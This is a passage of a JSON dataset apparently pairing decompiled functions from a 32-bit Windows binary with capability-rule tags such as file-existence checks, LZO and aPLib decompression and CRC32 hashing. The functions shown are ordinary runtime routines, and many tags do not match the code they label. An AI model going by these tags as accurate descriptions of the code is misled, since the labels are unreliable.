        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid __thiscall fcn.00422b20(int32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint uVar8;\n    bool bVar9;\n    int64_t iVar10;\n    int32_t aiStack80 [8];\n    uint uStack48;\n    char *pcStack44;\n    char *pcStack40;\n    char *pcStack36;\n    uint32_t uStack32;\n    \n    pcStack44 = param_1 + -1;\n    pcStack40 = pcStack44 >> 0x1f;\n    iVar7 = 1;\n    pcVar4 = pcStack44;\n    while (pcVar4 = pcVar4 / 10,  pcVar4 != NULL) {\n        iVar7 = iVar7 + 1;\n    }\n    iVar3 = *(param_2 + 0x28);\n    if (iVar3 == -1) {\n        *(param_2 + 0x28) = 2;\n        iVar3 = 2;\n    }\n    if (iVar7 <= iVar3) {\n        iVar7 = iVar3;\n    }\n    iVar3 = *(param_2 + 8) - (iVar7 + 2);\n    if (*(param_2 + 8) <= iVar7 + 2) {\n        iVar3 = -1;\n    }\n    *(param_2 + 8) = iVar3;\n    aiStack80[5] = param_2;\n    aiStack80[4] = 0x422bb9;\n    fcn.004223e0();\n    *(param_2 + 0xc) = *(param_2 + 0x28);\n    *(param_2 + 4) = *(param_2 + 4) | 0x1c0;\n    aiStack80[4] = 0x422bda;\n    fcn.00421fc0();\n    *(param_2 + 8) = *(param_2 + 8) + iVar7 + 1;\n    pcStack36 = pcStack44;\n    aiStack80[6] = *(param_2 + 0xc);\n    uStack32 = pcStack40;\n    pcStack44 = *(param_2 + 4);\n    aiStack80[5] = *(param_2 + 8);\n    aiStack80[0] = 0x422872;\n    iVar7 = fcn.00418950();\n    iVar7 = -iVar7;\n    pcStack40 = &stack0xffffffd3 + iVar7 & 0xfffffff0;\n    if ((pcStack44 & 0x80) != 0) {\n        if (uStack32 < 0) {\n            bVar9 = pcStack36 != NULL;\n            pcStack36 = -pcStack36;\n            uStack32 = -(uStack32 + bVar9);\n        }\n        else {\n            pcStack44 = pcStack44 & 0xffffff7f;\n            *(param_2 + 4) = pcStack44;\n        }\n    }\n    iVar10 = CONCAT44(uStack32, pcStack36);\n    uStack48 = pcStack44 & 0x1000;\n    pcVar4 = pcStack40;\n    if ((uStack32 | pcStack36) != 0) {\n        aiStack80[7] = param_2;\n        pcStack36 = pcStack40;\n        while( true ) {\n            pcVar5 = pcStack36;\n            uVar8 = iVar10 >> 0x20;\n            *(&stack0xffffffb4 + iVar7) = iVar10;\n            *(&stack0xffffffb8 + iVar7) = uVar8;\n            *(&stack0xffffffbc + iVar7) = 10;\n            *(&stack0xffffffc0 + iVar7) = 0;\n            pcStack36 = pcVar5 + 1;\n            *(&stack0xffffffb0 + iVar7) = 0x4228e7;\n            cVar1 = fcn.00418a80();\n            *pcVar5 = cVar1 + '0';\n            *(&stack0xffffffb4 + iVar7) = iVar10;\n            *(&stack0xffffffb8 + iVar7) = uVar8;\n            *(&stack0xffffffbc + iVar7) = 10;\n            *(&stack0xffffffc0 + iVar7) = 0;\n            *(&stack0xffffffb0 + iVar7) = 0x422908;\n            iVar10 = fcn.00418980();\n            pcVar4 = pcStack36;\n            param_2 = aiStack80[7];\n            if (iVar10 == 0) break;\n            if ((((pcStack40 != pcStack36) && (uStack48 != 0)) && (*(aiStack80[7] + 0x1c) != 0)) &&\n               (uVar6 = (pcStack36 - pcStack40 >> 0x1f) >> 0x1e,  ((pcStack36 - pcStack40) + uVar6 & 3) - uVar6 == 3)) {\n                pcVar5[1] = ',';\n                pcStack36 = pcVar5 + 2;\n            }\n        }\n    }\n    if ((0 < aiStack80[6]) && (iVar3 = aiStack80[6] - (pcVar4 - pcStack40),  0 < iVar3)) {\n        pcVar2 = pcVar4 + iVar3;\n        pcVar5 = pcVar4;\n        do {\n            pcVar4 = pcVar5 + 1;\n            *pcVar5 = '0';\n            pcVar5 = pcVar4;\n        } while (pcVar4 != pcVar2);\n    }\n    if ((pcStack40 == pcVar4) && (aiStack80[6] != 0)) {\n        *pcVar4 = '0';\n        pcVar4 = pcVar4 + 1;\n    }\n    if (0 < aiStack80[5]) {\n        iVar3 = aiStack80[5] - (pcVar4 - pcStack40);\n        *(param_2 + 8) = iVar3;\n        if (0 < iVar3) {\n            if ((pcStack44 & 0x1c0) != 0) {\n                *(param_2 + 8) = iVar3 + -1;\n            }\n            if ((aiStack80[6] < 0) && ((pcStack44 & 0x600) == 0x200)) {\n                iVar3 = *(param_2 + 8);\n                *(param_2 + 8) = iVar3 + -1;\n                if (0 < iVar3) {\n                    pcVar2 = pcVar4 + iVar3;\n                    pcVar5 = pcVar4;\n                    do {\n                        pcVar4 = pcVar5 + 1;\n                        *pcVar5 = '0';\n                        pcVar5 = pcVar4;\n                    } while (pcVar4 != pcVar2);\n                    *(param_2 + 8) = 0xffffffff;\n                }\n            }\n            else if (((pcStack44 & 0x400) == 0) && (iVar3 = *(param_2 + 8),  *(param_2 + 8) = iVar3 + -1,  0 < iVar3)) {\n                do {\n                    *(&stack0xffffffb0 + iVar7) = 0x422a8c;\n                    fcn.00421fc0();\n                    iVar3 = *(param_2 + 8);\n                    *(param_2 + 8) = iVar3 + -1;\n                } while (0 < iVar3);\n                pcStack44 = *(param_2 + 4);\n            }\n        }\n    }\n    pcVar5 = pcStack40;\n    if ((pcStack44 & 0x80) == 0) {\n        if ((pcStack44 & 0x100) == 0) {\n            pcVar2 = pcVar4;\n            if ((pcStack44 & 0x40) != 0) {\n                pcVar2 = pcVar4 + 1;\n                *pcVar4 = ' ';\n            }\n        }\n        else {\n            *pcVar4 = '+';\n            pcVar2 = pcVar4 + 1;\n        }\n    }\n    else {\n        *pcVar4 = '-';\n        pcVar2 = pcVar4 + 1;\n    }\n    if (pcVar2 <= pcStack40) goto code_r0x00422a0e;\n    do {\n        pcVar2 = pcVar2 + -1;\n        *(&stack0xffffffb0 + iVar7) = 0x4229f1;\n        fcn.00421fc0();\n    } while (pcVar5 != pcVar2);\n    iVar3 = *(param_2 + 8);\n    *(param_2 + 8) = iVar3 + -1;\n    while (0 < iVar3) {\n        *(&stack0xffffffb0 + iVar7) = 0x422a0e;\n        fcn.00421fc0();\ncode_r0x00422a0e:\n        iVar3 = *(param_2 + 8);\n        *(param_2 + 8) = iVar3 + -1;\n    }\n    return;\n}\n",
        "token_count": 2057
    },
    "00428fb0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00428fb0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    iVar3 = param_1;\n    do {\n        while (iVar1 = sub.msvcrt.dll__write(),  iVar1 != -1) {\n            iVar3 = iVar3 - iVar1;\n            if (iVar3 == 0) {\n                return param_1;\n            }\n        }\n        piVar2 = (*_sym.imp.msvcrt.dll__errno)();\n    } while (*piVar2 == 4);\n    return param_1 - iVar3;\n}\n",
        "token_count": 145
    },
    "00430ce0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00430ce0(int32_t **param_1, int32_t **param_2)\n\n{\n    int32_t *piVar1;\n    bool bVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    bool bVar4;\n    bool bStack13;\n    \n    piVar1 = *param_1;\n    bVar4 = piVar1 != NULL && param_1[1] == 0xffffffff;\n    bStack13 = param_1[1] == 0xffffffff;\n    if (bVar4) {\n        in_EAX = piVar1[3];\n        bStack13 = false;\n        if (in_EAX <= piVar1[2]) {\n            bStack13 = false;\n            in_EAX = (**(*piVar1 + 0x24))();\n            if (in_EAX == 0xffffffff) {\n                *param_1 = NULL;\n                bStack13 = bVar4;\n            }\n        }\n    }\n    piVar1 = *param_2;\n    uVar3 = in_EAX & 0xffffff00;\n    bVar2 = piVar1 != NULL && param_2[1] == 0xffffffff;\n    bVar4 = param_2[1] == 0xffffffff;\n    if (bVar2) {\n        uVar3 = piVar1[3];\n        bVar4 = false;\n        if (uVar3 <= piVar1[2]) {\n            uVar3 = (**(*piVar1 + 0x24))();\n            if (uVar3 == 0xffffffff) {\n                *param_2 = NULL;\n                bVar4 = bVar2;\n            }\n        }\n    }\n    return uVar3 & 0xffffff00 | bStack13 == bVar4;\n}\n",
        "token_count": 396
    },
    "00430d80": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00430d80(uint param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t **in_EAX;\n    \n    piVar1 = *in_EAX;\n    if ((param_2 == 0xffffffff) && (piVar1 != NULL)) {\n        if (piVar1[2] < piVar1[3]) {\n            return *piVar1[2];\n        }\n        param_2 = (**(*piVar1 + 0x24))();\n        if (param_2 == 0xffffffff) {\n            *in_EAX = NULL;\n        }\n    }\n    return param_2;\n}\n",
        "token_count": 151
    },
    "00430dd0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00430dd0(uint param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t **in_EAX;\n    \n    piVar1 = *in_EAX;\n    if ((param_2 == 0xffffffff) && (piVar1 != NULL)) {\n        if (piVar1[2] < piVar1[3]) {\n            return *piVar1[2];\n        }\n        param_2 = (**(*piVar1 + 0x24))();\n        if (param_2 == 0xffffffff) {\n            *in_EAX = NULL;\n        }\n    }\n    return param_2;\n}\n",
        "token_count": 151
    },
    "00485e80": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00485e80(int32_t *param_1)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    code *UNRECOVERED_JUMPTABLE;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    puVar2 = param_1[2];\n    if (puVar2 < param_1[3]) {\n        uVar1 = *puVar2;\n        param_1[2] = puVar2 + 1;\n        return uVar1;\n    }\n    UNRECOVERED_JUMPTABLE = *(*param_1 + 0x28);\n    if (UNRECOVERED_JUMPTABLE == method.c_streambufIwSt11char_traitsIwEE.virtual_40) {\n        UNRECOVERED_JUMPTABLE = *(*param_1 + 0x24);\n        if (UNRECOVERED_JUMPTABLE == method.c_streambufIwSt11char_traitsIwEE.virtual_36) {\n            return 0xffffffff;\n        }\n        iVar3 = (*UNRECOVERED_JUMPTABLE)();\n        if (iVar3 == -1) {\n            uVar4 = 0xffffffff;\n        }\n        else {\n            uVar4 = *param_1[2];\n            param_1[2] = param_1[2] + 1;\n        }\n        return uVar4;\n    }\n    // WARNING: Could not recover jumptable at 0x00485eb0. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar4 = (*UNRECOVERED_JUMPTABLE)();\n    return uVar4;\n}\n",
        "token_count": 367
    },
    "0049d950": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0049d950(uchar *param_1, uchar param_2, char *param_3, int32_t param_4, uchar *param_5, uchar *param_6)\n\n{\n    uchar *puVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    uchar *puVar8;\n    uchar *puVar9;\n    int32_t iStack24;\n    \n    uVar5 = 0;\n    iStack24 = 0;\n    uVar3 = *param_3;\n    uVar6 = uVar3;\n    while (uVar3 < param_6 - param_5) {\n        while( true ) {\n            if (0x7d < uVar6 - 1U) goto code_r0x0049d9b8;\n            param_6 = param_6 + -uVar3;\n            if (param_4 - 1U <= uVar5) break;\n            uVar5 = uVar5 + 1;\n            uVar6 = param_3[uVar5];\n            uVar3 = param_3[uVar5];\n            if (param_6 - param_5 <= uVar3) goto code_r0x0049d9b8;\n        }\n        iStack24 = iStack24 + 1;\n    }\ncode_r0x0049d9b8:\n    puVar7 = param_5;\n    puVar8 = param_1;\n    if (param_6 != param_5) {\n        do {\n            puVar9 = puVar7 + 1;\n            *puVar8 = *puVar7;\n            puVar7 = puVar9;\n            puVar8 = puVar8 + 1;\n        } while (param_6 != puVar9);\n        param_1 = param_1 + (param_6 - param_5);\n    }\n    while (iStack24 = iStack24 + -1,  iStack24 != -1) {\n        while( true ) {\n            puVar7 = param_1 + 1;\n            *param_1 = param_2;\n            uVar2 = param_3[uVar5];\n            param_1 = puVar7;\n            if (uVar2 < '\\x01') break;\n            puVar8 = param_6;\n            puVar9 = puVar7;\n            do {\n                puVar1 = puVar8 + 1;\n                *puVar9 = *puVar8;\n                puVar8 = puVar1;\n                puVar9 = puVar9 + 1;\n            } while (puVar1 != param_6 + (uVar2 - 1 & 0xff) + 1);\n            iStack24 = iStack24 + -1;\n            iVar4 = (uVar2 - 1) + 1;\n            param_6 = param_6 + iVar4;\n            param_1 = puVar7 + iVar4;\n            if (iStack24 == -1) goto joined_r0x0049da37;\n        }\n    }\njoined_r0x0049da37:\n    while (uVar5 = uVar5 - 1,  uVar5 != 0xffffffff) {\n        puVar7 = param_1 + 1;\n        *param_1 = param_2;\n        uVar2 = param_3[uVar5];\n        param_1 = puVar7;\n        if ('\\0' < uVar2) {\n            puVar8 = param_6;\n            puVar9 = puVar7;\n            do {\n                puVar1 = puVar8 + 1;\n                *puVar9 = *puVar8;\n                puVar8 = puVar1;\n                puVar9 = puVar9 + 1;\n            } while (puVar1 != param_6 + (uVar2 - 1 & 0xff) + 1);\n            iVar4 = (uVar2 - 1) + 1;\n            param_6 = param_6 + iVar4;\n            param_1 = puVar7 + iVar4;\n        }\n    }\n    return;\n}\n",
        "token_count": 920
    },
    "0049dab0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0049dab0(ushort *param_1, ushort param_2, char *param_3, int32_t param_4, ushort *param_5, ushort *param_6)\n\n{\n    ushort *puVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    char cVar5;\n    ushort *puVar6;\n    ushort *puVar7;\n    ushort *puVar8;\n    int32_t iStack24;\n    \n    iStack24 = 0;\n    cVar5 = *param_3;\n    uVar3 = 0;\n    iVar4 = cVar5;\n    while (iVar4 < param_6 - param_5 >> 1) {\n        while( true ) {\n            if (0x7d < cVar5 - 1U) goto code_r0x0049db1f;\n            param_6 = param_6 + -iVar4;\n            if (param_4 - 1U <= uVar3) break;\n            uVar3 = uVar3 + 1;\n            cVar5 = param_3[uVar3];\n            iVar4 = cVar5;\n            if (param_6 - param_5 >> 1 <= iVar4) goto code_r0x0049db1f;\n        }\n        iStack24 = iStack24 + 1;\n    }\ncode_r0x0049db1f:\n    puVar6 = param_5;\n    puVar7 = param_1;\n    if (param_6 != param_5) {\n        do {\n            puVar8 = puVar6 + 1;\n            *puVar7 = *puVar6;\n            puVar6 = puVar8;\n            puVar7 = puVar7 + 1;\n        } while (param_6 != puVar8);\n        iVar4 = (param_6 + (-2 - param_5) & 0xfffffffeU) + 2;\n        param_5 = param_5 + iVar4;\n        param_1 = iVar4 + param_1;\n    }\n    while (iStack24 = iStack24 + -1,  iStack24 != -1) {\n        while( true ) {\n            puVar6 = param_1 + 1;\n            *param_1 = param_2;\n            uVar2 = param_3[uVar3];\n            param_1 = puVar6;\n            if (uVar2 < '\\x01') break;\n            puVar7 = param_5;\n            puVar8 = puVar6;\n            do {\n                puVar1 = puVar7 + 1;\n                *puVar8 = *puVar7;\n                puVar7 = puVar1;\n                puVar8 = puVar8 + 1;\n            } while (puVar1 != param_5 + (uVar2 - 1 & 0xff) + 1);\n            iStack24 = iStack24 + -1;\n            param_5 = param_5 + (uVar2 - 1) + 1;\n            param_1 = puVar6 + (uVar2 - 1) + 1;\n            if (iStack24 == -1) goto joined_r0x0049dba6;\n        }\n    }\njoined_r0x0049dba6:\n    while (uVar3 = uVar3 - 1,  uVar3 != 0xffffffff) {\n        puVar6 = param_1 + 1;\n        *param_1 = param_2;\n        uVar2 = param_3[uVar3];\n        param_1 = puVar6;\n        if ('\\0' < uVar2) {\n            puVar7 = param_5;\n            puVar8 = puVar6;\n            do {\n                puVar1 = puVar7 + 1;\n                *puVar8 = *puVar7;\n                puVar7 = puVar1;\n                puVar8 = puVar8 + 1;\n            } while (puVar1 != param_5 + (uVar2 - 1 & 0xff) + 1);\n            param_5 = param_5 + (uVar2 - 1) + 1;\n            param_1 = puVar6 + (uVar2 - 1) + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 943
    },
    "00418fb0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint8_t ** __fastcall fcn.00418fb0(uint8_t **param_1, uint8_t **param_2, uint8_t **param_3)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    uint8_t in_AL;\n    int32_t iVar3;\n    code *pcVar4;\n    uint8_t **ppuVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    uint32_t uVar8;\n    uint8_t **ppuVar9;\n    uint8_t **ppuVar10;\n    \n    if (in_AL == 0x50) {\n        ppuVar5 = param_1 + 3 & 0xfffffffc;\n        *param_3 = *ppuVar5;\n        return ppuVar5 + 1;\n    }\n    // switch table (13 cases) at 0x50557c\n    switch(in_AL & 0xf) {\n    case 0:\n    case 3:\n    case 0xb:\n        ppuVar10 = *param_1;\n        ppuVar5 = param_1 + 1;\n        break;\n    case 1:\n        ppuVar10 = NULL;\n        uVar7 = 0;\n        ppuVar9 = param_1;\n        do {\n            ppuVar5 = ppuVar9 + 1;\n            uVar6 = *ppuVar9;\n            uVar1 = uVar7 & 0x1f;\n            uVar7 = uVar7 + 7;\n            ppuVar10 = ppuVar10 | (uVar6 & 0x7f) << uVar1;\n            ppuVar9 = ppuVar5;\n        } while (uVar6 < '\\0');\n        break;\n    case 2:\n        ppuVar10 = *param_1;\n        ppuVar5 = param_1 + 2;\n        break;\n    case 4:\n    case 0xc:\n        ppuVar10 = *param_1;\n        ppuVar5 = param_1 + 2;\n        break;\n    default:\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n        if (iVar3 == 0) {\n            *0x4ae004 = 0x41ca80;\n            pcVar4 = 0x41c830;\n        }\n        else {\n            *0x549df0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n            pcVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n            pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"__register_frame_info\");\n            *0x4ae004 = (*pcVar2)(iVar3, \"__deregister_frame_info\");\n        }\n        if (pcVar4 != NULL) {\n            (*pcVar4)(0x50c0f8, 0x54901c);\n        }\n        ppuVar5 = fcn.004014c0(fcn.00401590);\n        return ppuVar5;\n    case 9:\n        ppuVar10 = NULL;\n        uVar8 = 0;\n        ppuVar9 = param_1;\n        do {\n            ppuVar5 = ppuVar9 + 1;\n            uVar7 = *ppuVar9;\n            uVar6 = uVar8;\n            uVar8 = uVar8 + 7;\n            ppuVar10 = ppuVar10 | (uVar7 & 0x7f) << (uVar6 & 0x1f);\n            ppuVar9 = ppuVar5;\n        } while (uVar7 < '\\0');\n        if ((0x1f < uVar8) || ((uVar7 & 0x40) == 0)) break;\n        ppuVar10 = ppuVar10 | -1 << (uVar8 & 0x1f);\n        goto code_r0x00418fe9;\n    case 10:\n        ppuVar10 = *param_1;\n        ppuVar5 = param_1 + 2;\n    }\n    if (ppuVar10 != NULL) {\ncode_r0x00418fe9:\n        if ((in_AL & 0x70) != 0x10) {\n            param_1 = param_2;\n        }\n        ppuVar10 = ppuVar10 + param_1;\n        if (in_AL < '\\0') {\n            *param_3 = *ppuVar10;\n            return ppuVar5;\n        }\n    }\n    *param_3 = ppuVar10;\n    return ppuVar5;\n}\n",
        "token_count": 1161
    },
    "0041b7a0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint8_t ** __fastcall fcn.0041b7a0(uint8_t **param_1, uint8_t **param_2, uint8_t **param_3)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    uint8_t in_AL;\n    int32_t iVar3;\n    code *pcVar4;\n    uint8_t **ppuVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    uint32_t uVar8;\n    uint8_t **ppuVar9;\n    uint8_t **ppuVar10;\n    \n    if (in_AL == 0x50) {\n        ppuVar5 = param_1 + 3 & 0xfffffffc;\n        *param_3 = *ppuVar5;\n        return ppuVar5 + 1;\n    }\n    // switch table (13 cases) at 0x505a98\n    switch(in_AL & 0xf) {\n    case 0:\n    case 3:\n    case 0xb:\n        ppuVar10 = *param_1;\n        ppuVar5 = param_1 + 1;\n        break;\n    case 1:\n        ppuVar10 = NULL;\n        uVar7 = 0;\n        ppuVar9 = param_1;\n        do {\n            ppuVar5 = ppuVar9 + 1;\n            uVar6 = *ppuVar9;\n            uVar1 = uVar7 & 0x1f;\n            uVar7 = uVar7 + 7;\n            ppuVar10 = ppuVar10 | (uVar6 & 0x7f) << uVar1;\n            ppuVar9 = ppuVar5;\n        } while (uVar6 < '\\0');\n        break;\n    case 2:\n        ppuVar10 = *param_1;\n        ppuVar5 = param_1 + 2;\n        break;\n    case 4:\n    case 0xc:\n        ppuVar10 = *param_1;\n        ppuVar5 = param_1 + 2;\n        break;\n    default:\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        sub.msvcrt.dll_abort();\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n        if (iVar3 == 0) {\n            *0x4ae004 = 0x41ca80;\n            pcVar4 = 0x41c830;\n        }\n        else {\n            *0x549df0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n            pcVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n            pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"__register_frame_info\");\n            *0x4ae004 = (*pcVar2)(iVar3, \"__deregister_frame_info\");\n        }\n        if (pcVar4 != NULL) {\n            (*pcVar4)(0x50c0f8, 0x54901c);\n        }\n        ppuVar5 = fcn.004014c0(fcn.00401590);\n        return ppuVar5;\n    case 9:\n        ppuVar10 = NULL;\n        uVar8 = 0;\n        ppuVar9 = param_1;\n        do {\n            ppuVar5 = ppuVar9 + 1;\n            uVar7 = *ppuVar9;\n            uVar6 = uVar8;\n            uVar8 = uVar8 + 7;\n            ppuVar10 = ppuVar10 | (uVar7 & 0x7f) << (uVar6 & 0x1f);\n            ppuVar9 = ppuVar5;\n        } while (uVar7 < '\\0');\n        if ((0x1f < uVar8) || ((uVar7 & 0x40) == 0)) break;\n        ppuVar10 = ppuVar10 | -1 << (uVar8 & 0x1f);\n        goto code_r0x0041b7d9;\n    case 10:\n        ppuVar10 = *param_1;\n        ppuVar5 = param_1 + 2;\n    }\n    if (ppuVar10 != NULL) {\ncode_r0x0041b7d9:\n        if ((in_AL & 0x70) != 0x10) {\n            param_1 = param_2;\n        }\n        ppuVar10 = ppuVar10 + param_1;\n        if (in_AL < '\\0') {\n            *param_3 = *ppuVar10;\n            return ppuVar5;\n        }\n    }\n    *param_3 = ppuVar10;\n    return ppuVar5;\n}\n",
        "token_count": 1071
    },
    "00464240": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nint32_t fcn.00464240(uint32_t param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *extraout_ECX;\n    \n    if (param_1 < 0x1fffffff) {\n        if (param_2 < param_1) {\n            if (param_1 < param_2 * 2) {\n                param_1 = param_2 * 2;\n            }\n            iVar3 = param_1 * 2 + 0xe;\n            uVar1 = param_1 * 2 + 0x1e;\n            if ((0x1000 < uVar1) && (param_2 < param_1)) {\n                param_1 = param_1 + (0x1000 - (uVar1 & 0xfff) >> 1);\n                if (0x1ffffffe < param_1) {\n                    param_1 = 0x1ffffffe;\n                }\n                iVar3 = param_1 * 2 + 0xe;\n            }\n        }\n        else {\n            iVar3 = param_1 * 2 + 0xe;\n        }\n        iVar3 = fcn.004a3500(iVar3);\n        *(iVar3 + 4) = param_1;\n        *(iVar3 + 8) = 0;\n        return iVar3;\n    }\n    fcn.0049ec30(\"basic_string::_S_create\");\n    iVar3 = *extraout_ECX;\n    iVar2 = *(iVar3 + -0xc);\n    if (-1 < *(iVar3 + -4)) {\n        fcn.00463b40();\n        iVar3 = *extraout_ECX;\n    }\n    return iVar3 + (iVar2 + -1) * 2;\n}\n",
        "token_count": 399
    },
    "0041eef0": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.0041eef0(int32_t param_1, uint32_t param_2)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    \n    iVar4 = param_2 + 0x1f >> 5;\n    if (*(param_1 + 4) < iVar4) {\n        fcn.00426a80(param_1);\n        param_1 = fcn.004269b0(iVar4);\n    }\n    puVar2 = param_1 + 0x14;\n    iVar4 = param_2 >> 5;\n    param_2 = param_2 & 0x1f;\n    if (param_2 == 0) {\n        *(param_1 + 0x10) = iVar4;\n        puVar1 = puVar2 + iVar4;\n        if (puVar1 <= puVar2) {\n            return;\n        }\n    }\n    else {\n        *(param_1 + 0x10) = iVar4 + 1;\n        puVar1 = puVar2 + iVar4 + 1;\n        puVar3 = puVar2;\n        if (puVar1 <= puVar2) goto code_r0x0041ef34;\n    }\n    do {\n        puVar3 = puVar2 + 1;\n        *puVar2 = 0xffffffff;\n        puVar2 = puVar3;\n    } while (puVar3 < puVar1);\n    if (param_2 == 0) {\n        return;\n    }\ncode_r0x0041ef34:\n    puVar3[-1] = puVar3[-1] >> (0x20U - param_2 & 0x1f);\n    return;\n}\n",
        "token_count": 387
    },
    "00426f00": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nint32_t fcn.00426f00(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int8_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t *puVar6;\n    uint32_t *puVar7;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    uint32_t *puVar13;\n    uint32_t *puVar14;\n    uint8_t uStack44;\n    uint32_t *puVar8;\n    \n    iVar10 = *(param_1 + 4);\n    iVar12 = param_2 >> 5;\n    iVar4 = *(param_1 + 0x10) + iVar12;\n    iVar11 = iVar4 + 1;\n    iVar5 = *(param_1 + 8);\n    if (iVar5 < iVar11) {\n        do {\n            iVar1 = iVar5 * 2;\n            iVar10 = iVar10 + 1;\n            iVar2 = iVar5 * -2;\n            iVar5 = iVar1;\n        } while (iVar11 != iVar1 && SBORROW4(iVar11, iVar1) == iVar11 + iVar2 < 0);\n    }\n    iVar10 = fcn.004269b0(iVar10);\n    if (iVar10 != 0) {\n        puVar6 = iVar10 + 0x14;\n        if (0 < iVar12) {\n            puVar13 = puVar6 + iVar12;\n            puVar7 = puVar6;\n            do {\n                puVar8 = puVar7 + 1;\n                *puVar7 = 0;\n                puVar7 = puVar8;\n                puVar6 = puVar13;\n            } while (puVar8 != puVar13);\n        }\n        puVar13 = param_1 + 0x14;\n        puVar7 = puVar13 + *(param_1 + 0x10);\n        if ((param_2 & 0x1f) == 0) {\n            do {\n                puVar14 = puVar6 + 1;\n                puVar8 = puVar13 + 1;\n                *puVar6 = *puVar13;\n                if (puVar7 <= puVar8) break;\n                puVar6 = puVar6 + 2;\n                puVar13 = puVar13 + 2;\n                *puVar14 = *puVar8;\n            } while (puVar13 < puVar7);\n        }\n        else {\n            iVar3 = param_2 & 0x1f;\n            uStack44 = 0x20 - iVar3;\n            uVar9 = 0;\n            do {\n                puVar14 = puVar6;\n                puVar8 = puVar13 + 1;\n                *puVar14 = uVar9 | *puVar13 << iVar3;\n                uVar9 = *puVar13 >> (uStack44 & 0x1f);\n                puVar13 = puVar8;\n                puVar6 = puVar14 + 1;\n            } while (puVar8 < puVar7);\n            puVar14[1] = uVar9;\n            if (uVar9 != 0) {\n                iVar11 = iVar4 + 2;\n            }\n        }\n        *(iVar10 + 0x10) = iVar11 + -1;\n        fcn.00426a80(param_1);\n    }\n    return iVar10;\n}\n",
